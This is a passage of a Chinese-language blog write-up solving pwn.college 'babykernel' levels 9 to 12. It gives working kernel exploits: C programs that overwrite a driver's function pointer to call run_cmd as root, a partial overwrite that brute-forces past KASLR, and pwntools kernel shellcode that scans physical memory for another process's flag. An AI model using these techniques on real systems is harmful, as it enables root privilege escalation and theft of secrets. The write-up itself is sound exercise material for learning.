class="comment">// rcx</span></span><br><span class="line">  device_write::$E0E722039EE6959F0A964D09D15C93E1 *p_logger; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbp</span></span><br><span class="line">  device_write::$E0E722039EE6959F0A964D09D15C93E1 logger; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">66L</span>L;</span><br><span class="line">  v10 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  p_logger = &amp;logger;</span><br><span class="line">  <span class="keyword">while</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    *p_logger-&gt;buffer = <span class="number">0</span>;</span><br><span class="line">    p_logger = (p_logger + <span class="number">4</span>);</span><br><span class="line">    --v4;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_11C0);</span><br><span class="line">  logger.log_function = &amp;printk;</span><br><span class="line">  <span class="keyword">if</span> ( length &gt; <span class="number">0x108</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">264L</span>L, length);</span><br><span class="line">    BUG();</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = copy_from_user(&amp;logger, buffer, length);</span><br><span class="line">  logger.log_function(&amp;logger);</span><br><span class="line">  <span class="keyword">return</span> length - v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>往栈上写东西，然后执行<code>logger.log_function(&amp;logger);</code>而参数<code>&amp;logger</code>即为我们输入的栈地址，<code>log_function</code>位于<code>&amp;logger+0x100</code>，被初始化为<code>&amp;printk</code><br>允许读入<code>0x108</code>字节</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>不难看出应该是要修改函数指针，执行特定的函数，同时能沟通控制第一个参数</p>
<p>考虑利用<code>run_cmd</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> **argv;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	argv = argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (argv) &#123;</span><br><span class="line">		ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">		argv_free(argv);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * call_usermodehelper() - prepare and start a usermode application</span></span><br><span class="line"><span class="comment"> * @path: path to usermode executable</span></span><br><span class="line"><span class="comment"> * @argv: arg vector for process</span></span><br><span class="line"><span class="comment"> * @envp: environment for process</span></span><br><span class="line"><span class="comment"> * @wait: wait for the application to finish and return status.</span></span><br><span class="line"><span class="comment"> *        when UMH_NO_WAIT don&#x27;t wait at all, but you get no useful error back</span></span><br><span class="line"><span class="comment"> *        when the program couldn&#x27;t be exec&#x27;ed. This makes it safe to call</span></span><br><span class="line"><span class="comment"> *        from interrupt context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function is the equivalent to use call_usermodehelper_setup() and</span></span><br><span class="line"><span class="comment"> * call_usermodehelper_exec().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line">					 <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概就是<code>run_cmd</code>里面调用了<code>call_usermodehelper</code>，该函数可以在内核中直接新建和运行用户空间程序（<strong>prepare and start a usermode application</strong>）<br>并且该程序具有root权限，只要将参数传递正确就可以执行任意命令。<br>该函数与<code>execve</code>的函数参数相似，第一个参数必须是程序的全/绝对路径（<strong>STATIC_USERMODEHELPER_PATH</strong>）</p>
<h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><p><code>/home/hacker/orw</code>写下命令，把flag存起来<br>直接cat看不到flag，因为命令在内核中执行的就不太知道输出到哪了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag &gt; /home/hacker/ans</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  assert(fd &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> scTmp[<span class="number">0x108</span>] = <span class="string">&quot;/bin/sh /home/hacker/orw&quot;</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(scTmp+<span class="number">24</span>, <span class="string">&quot;\x00\x00&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">  <span class="built_in">memcpy</span>(scTmp+<span class="number">0x100</span>, <span class="string">&quot;\x70\x95\x08\x81\xff\xff\xff\xff&quot;</span>, <span class="number">8</span>); <span class="comment">//run_cmd</span></span><br><span class="line">  write(fd, scTmp, <span class="number">0x108</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, getuid());</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h1><p>same</p>
<h1 id="level10-0"><a href="#level10-0" class="headerlink" title="level10.0"></a>level10.0</h1><p>内容和level9.0一样，区别在于这里开启了<code>kaslr</code></p>
<p>那么我们可以利用<code>partial overwrite</code>的思想覆盖后三个字节，爆破1/16就行了</p>
<p>注意每次失败后要执行<code>vm restart</code></p>
<h2 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">// 0xffffffffb44b6319</span></span><br><span class="line"><span class="comment">// 0xffffffffb4489570</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  assert(fd &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> scTmp[<span class="number">0x108</span>] = <span class="string">&quot;/bin/sh /home/hacker/orw&quot;</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(scTmp+<span class="number">24</span>, <span class="string">&quot;\x00\x00&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">  <span class="built_in">memcpy</span>(scTmp+<span class="number">0x100</span>, <span class="string">&quot;\x70\x95\x48&quot;</span>, <span class="number">3</span>); <span class="comment">//run_cmd</span></span><br><span class="line">  write(fd, scTmp, <span class="number">0x103</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, getuid());</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// run_cmd 0xffffffff8fe89570</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h1><p>一样</p>
<h1 id="level11-0"><a href="#level11-0" class="headerlink" title="level11.0"></a>level11.0</h1><p>也是有意思的一题</p>
<p>形式上和level8类似，同样需要运行elf文件输入shellcode，利用驱动把部分shellcode写到内核空间并执行</p>
<h3 id="device-write-6"><a href="#device-write-6" class="headerlink" title="device_write"></a>device_write</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_F08, file, buffer, length, offset);</span><br><span class="line">  v5 = <span class="number">4096L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  v6 = copy_from_user(shellcode, buffer, v5);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> length - v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><h3 id="load-flag"><a href="#load-flag" class="headerlink" title="load_flag"></a>load_flag</h3><p>和level8相比，本题区别在于程序会在子进程中把flag读到bss段上然后进入死循环<br>父进程在子进程读完flag以后，会使用<code>unlink</code>删除flag文件，然后上沙箱ban掉除了write的系统调用，最后输入并执行shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">load_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">sem_t</span> *sem; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Attempting to load the flag into memory.\n&quot;</span>);</span><br><span class="line">  sem = (<span class="keyword">sem_t</span> *)mmap(<span class="number">0L</span>L, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0L</span>L);</span><br><span class="line">  sem_init(sem, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    read(fd, &amp;flag_17387, <span class="number">0x100</span>uLL);</span><br><span class="line">    close(fd);</span><br><span class="line">    sem_post(sem);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sem_wait(sem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load_flag();</span><br><span class="line">unlink(<span class="string">&quot;/flag&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>根据进程虚拟内存的知识我们知道程序里各种段的地址都是物理地址映射到虚拟地址空间中的，而物理内存是整个系统共享的<br>所以第一，子进程把flag读到bss段上但父进程的bss段上并没有数据；<br>第二，子进程读入的数据必然存在于物理内存中，那么我们就可以考虑通过在kernel中执行shellcode对flag进行搜索，具体来可以通过比较flag开头的几个字符确定</p>
<p>事实上kernel提供了宏定义（macros）进行虚拟地址和物理地址之间的转换<br><code>phys_to_virt()</code>将一个物理地址转换成虚拟地址<br><code>virt_to_phys()</code>将一个虚拟地址转换成物理地址</p>
<p><code>phys_to_virt(i)</code>其实等价于<code>page_offset_base+i</code></p>
<p>对于本题来说，flag实际上会存在于一个物理地址，这个物理地址是<code>page_offset_base+?*0x1000+0x120</code></p>
<p>最后，由于当前环境没有开启kaslr，经过调试可以发现<code>page_offset_base</code>是一个定值为<code>0xffff888000000000</code></p>
<h2 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">base=<span class="string">&quot;echo -ne &#123;&#125; | /challenge/babykernel_level11.0&quot;</span></span><br><span class="line">kernel_code=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rbx,0x6c6c6f632e6e7770</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">add rdi,0x120</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rsi,0xffff888000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">add rdi, 0x1000</span></span><br><span class="line"><span class="string">cmp rbx,qword ptr [rsi+rdi]</span></span><br><span class="line"><span class="string">jnz loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">xor rcx, rcx</span></span><br><span class="line"><span class="string">add rsi,rdi</span></span><br><span class="line"><span class="string">lea rdi,[rip+16]</span></span><br><span class="line"><span class="string">mov rdx, rsi</span></span><br><span class="line"><span class="string">mov rcx, 0xffffffff810b6319</span></span><br><span class="line"><span class="string">call rcx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;flag:%s addr:0x%llx\x00&quot;</span></span><br><span class="line"></span><br><span class="line">code=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,0x3133701f</span></span><br><span class="line"><span class="string">mov rdx,&#123;&#125;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(s)+<span class="built_in">len</span>(asm(kernel_code)))</span><br><span class="line"><span class="built_in">print</span> code+kernel_code</span><br><span class="line"></span><br><span class="line">code=asm(code+kernel_code)</span><br><span class="line">code+=s</span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> code:</span><br><span class="line">    result+=<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">2</span>:]))</span><br><span class="line">result+=<span class="string">&#x27;\&#x27;&#x27;</span></span><br><span class="line">print(base.<span class="built_in">format</span>(result))</span><br></pre></td></tr></table></figure>

<h2 id="后记-2"><a href="#后记-2" class="headerlink" title="后记"></a>后记</h2><ul>
<li>避免使用pwntools运行程序输入shellcode，会发生很多意料之外的事情，原因可能在于python进程对内核空间产生了影响。所以最后直接使用echo输入shellcode</li>
<li>有时候可能由于不明的原因会出现搜索时步长0x1000找不到的情况，可以选择每次加一来找，因为物理空间的地址都是连续的所以也不会在找到flag之前crash，只不过逐地址比较需要多次打印。因为有的是其他进程残留的内容实际上不是flag</li>
<li>打印地址的时候尝试使用<code>%p</code>失败，是因为这里<code>%p</code>会自动hashed来避免kernel内存地址的泄露</li>
<li>特别感谢熊哥的帮助</li>
</ul>
<h1 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h1><p>略</p>
<h1 id="level12-0"><a href="#level12-0" class="headerlink" title="level12.0"></a>level12.0</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">__pid_t</span> <span class="title">load_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Attempting to load the flag into memory.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    read(fd, &amp;flag_17353, <span class="number">0x100</span>uLL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> wait(<span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和level11唯一的区别在于这一次子进程在读完flag之后直接exit了</p>
<h2 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h2><p>在解题思路上和level11没有区别。</p>
<p>最后放一张效果图<br><a target="_blank" rel="noopener" href="https://imgtu.com/i/qIhYB6"><img src="https://s1.ax1x.com/2022/04/02/qIhYB6.png" alt="qIhYB6.png"></a></p>
<h1 id="level12-1"><a href="#level12-1" class="headerlink" title="level12.1"></a>level12.1</h1><p>略</p>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>断断续续的写完了，其实跨越时间还蛮长的（<br>总的来说还是蛮有意思的，算是小有收获，也顺便练习了一下洋文了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">aYoung</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://iamayoung.xyz/2022/02/04/pwncollege-babykernel%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">https://iamayoung.xyz/2022/02/04/pwncollege-babykernel%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://iamayoung.xyz" target="_blank">aYoung's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/kernel/">kernel</a></div><div class="post_share"><div class="social-share" data-image="https://s4.ax1x.com/2022/02/04/HeHoPf.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/13/%E3%80%90WP%E3%80%91vnctf2022%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"><img class="prev-cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【WP】vnctf2022复现学习</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/29/%E3%80%90WP%E3%80%91hgame-week1%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【WP】hgame-Week1复现学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/17/phppwn浅浅探/" title="Phppwn浅浅探"><img class="cover" src="https://s4.ax1x.com/2022/01/17/7aXpHx.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">Phppwn浅浅探</div></div></a></div><div><a href="/2022/01/15/浅学kernelpwn/" title="浅学Kernelpwn"><img class="cover" src="https://s4.ax1x.com/2022/01/15/7JvdaD.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-15</div><div class="title">浅学Kernelpwn</div></div></a></div><div><a href="/2020/11/20/CPU工作/" title="PWN入门之cpu工作原理"><img class="cover" src="https://ftp.bmp.ovh/imgs/2020/12/d91e03ffbfd03bc3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-20</div><div class="title">PWN入门之cpu工作原理</div></div></a></div><div><a href="/2021/07/28/House-of-Orange/" title="House_of_Orange"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-28</div><div class="title">House_of_Orange</div></div></a></div><div><a href="/2021/07/26/FSOP/" title="FSOP"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/06/373b822d88c4973e.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-26</div><div class="title">FSOP</div></div></a></div><div><a href="/2021/07/14/House-of-Rabbit/" title="House_of_Rabbit"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-14</div><div class="title">House_of_Rabbit</div></div></a></div></div></div><hr/><div id="post-comment"><div 